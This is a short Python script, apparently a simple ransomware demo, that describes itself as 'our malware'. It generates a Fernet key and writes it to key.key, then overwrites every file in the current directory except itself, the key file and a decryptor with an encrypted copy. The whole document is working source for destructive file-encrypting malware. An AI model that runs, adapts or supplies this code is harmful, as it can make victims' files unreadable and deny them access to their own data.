# Modules Used:
import os
from cryptography.fernet import Fernet #Used to encrypt and decrypt data securely.

# An empty list to store file names that will be encrypted.
files = []

# Generates a new Fernet key used for encrypting and decrypting data. This key is crucial — losing it means the data can't be decrypted.
Fernetkey = Fernet.generate_key()

# Appending the file in the files list
for file in os.listdir():

    # Skipping our malware and the key file to not to get encrypted
    if file == "encrypt.py" or file == "key.key" or file == "decrypt.py":
        continue

    # Appending
    if os.path.isfile(file):
        files.append(file)

# Making the key file and writing the key in it
with open("key.key", "wb") as key:
    key.write(Fernetkey)

# Encrypting all the files
for file in files:

    #Collecting the data of the file
    with open(file, "rb") as thefile:
        content = thefile.read()

    # Encrypting the Data
    content_encrypted = Fernet(Fernetkey).encrypt(content)

    # Pasting the encrypted data into the file
    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)